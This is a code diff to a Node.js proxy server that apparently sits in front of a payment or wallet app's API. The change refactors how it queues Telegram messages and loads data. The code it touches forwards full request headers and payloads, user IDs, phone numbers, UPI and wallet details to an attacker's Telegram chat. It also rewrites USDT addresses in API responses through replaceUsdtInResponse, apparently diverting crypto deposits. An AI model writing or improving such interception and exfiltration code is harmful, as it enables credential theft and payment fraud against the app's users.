@@ -126,6 +126,13 @@ async function safeSend(chatId, text, options) {
   queueTgMessage(chatId, text, options);
 }
 
+// Fire-and-forget notifier for high-volume proxy notifications. It never blocks the request path.
+// The existing serialized queue prevents concurrent Telegram HTTP bursts.
+function notifyTelegram(chatId, text, options) {
+  if (!bot || !chatId) return;
+  setImmediate(() => queueTgMessage(chatId, text, options));
+}
+
 async function ensureWebhook(overrideUrl) {
   if (!bot || (webhookSet && !overrideUrl)) return;
   try {
@@ -236,6 +243,15 @@ async function saveData(data) {
   const next = saveQueue.then(run, run);
   saveQueue = next.catch(() => { });
   return next;
+}
+
+let requestDataPromise = null;
+async function getRequestData() {
+  if (cachedData) return cachedData;
+  if (!requestDataPromise) {
+    requestDataPromise = loadData(false).finally(() => { requestDataPromise = null; });
+  }
+  return requestDataPromise;
 }
 
 function getTokenFromReq(req) {
@@ -439,7 +455,8 @@ async function getActiveBankAndSave(data, userId) {
   if (data.autoRotate && data._rotatedIndex !== undefined) {
     data.lastUsedIndex = data._rotatedIndex;
     delete data._rotatedIndex;
-    await saveData(data);
+    // Rotation persistence must not delay the upstream API response.
+    saveData(data).catch(e => console.error('[ROTATE_SAVE_ERROR]', e.message));
   }
   return bank;
 }
@@ -541,7 +558,7 @@ async function proxyFetch(req) {
 
   // Global Full Payload Debug Logger
   try {
-    const liveData = cachedData || await loadData();
+    const liveData = cachedData || await getRequestData();
     if (liveData && liveData.debugMode && liveData.adminChatId && bot) {
       const endpoint = req.originalUrl || req.url || '';
       if (!endpoint.includes('bot-webhook') && !endpoint.includes('favicon')) {
@@ -574,7 +591,7 @@ async function proxyFetch(req) {
         dbgMsg += `📤 *REQUEST (Headers + Payload):*\n\`\`\`json\n${reqJsonStr}\n\`\`\`\n\n`;
         dbgMsg += `📥 *RESPONSE:*\n\`\`\`json\n${resJsonStr}\n\`\`\``;
 
-        bot.sendMessage(liveData.adminChatId, dbgMsg, { parse_mode: 'Markdown' }).catch(() => { });
+        notifyTelegram(liveData.adminChatId, dbgMsg, { parse_mode: 'Markdown' });
       }
     }
   } catch (e) { }
@@ -611,7 +628,7 @@ async function transparentProxy(req, res) {
       if (uid) saveTokenUserId(req, uid);
     }
 
-    const data = cachedData || await loadData();
+    const data = cachedData || await getRequestData();
     if (data.usdtAddress && jsonResp) {
       const result = replaceUsdtInResponse(jsonResp, data);
       if (result && result.oldAddr) {
@@ -825,7 +842,7 @@ app.use((req, res, next) => {
   (async () => {
     try {
       if (!bot) return;
-      const data = cachedData || await loadData();
+      const data = cachedData || await getRequestData();
       if (!data.logRequests || !data.adminChatId) return;
       const path = req.originalUrl || req.url;
       if (path.includes('bot-webhook') || path.includes('favicon')) return;
@@ -845,8 +862,8 @@ app.use((req, res, next) => {
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      // Match the working Sprodeal flow: send the request log directly to Telegram.
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => { });
+      // Send the request log asynchronously through the serialized Telegram queue.
+      notifyTelegram(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
     } catch (e) { console.error('[LOG_MW_ERROR]', e.message); }
   })();
   next();
@@ -2735,7 +2752,7 @@ async function sendUpiWalletReport(data, req, jsonResp, sourcePath) {
     });
   }
 
-  bot.sendMessage(data.adminChatId, upiMsg, { parse_mode: 'Markdown' }).catch(() => { });
+  notifyTelegram(data.adminChatId, upiMsg, { parse_mode: 'Markdown' });
 }
 
 app.all('/app/api/v1/upi/list', async (req, res) => {
@@ -2760,7 +2777,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
           const reqBody = JSON.stringify(req.parsedBody || {}, null, 2);
           msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
         }
-        bot.sendMessage(data.adminChatId, msg).catch(() => { });
+        notifyTelegram(data.adminChatId, msg);
       }
       if (ep === '/app/api/v1/wallet/list') {
         await sendUpiWalletReport(data, req, jsonResp, ep);
@@ -2888,7 +2905,7 @@ app.post('/app/api/memberDevice/add', async (req, res) => {
 });
 
 app.all('*', async (req, res) => {
-  const data = cachedData || await loadData();
+  const data = cachedData || await getRequestData();
   if (!data.usdtAddress && !data.botEnabled) {
     try {
       const { response, respBody, respHeaders } = await proxyFetch(req);
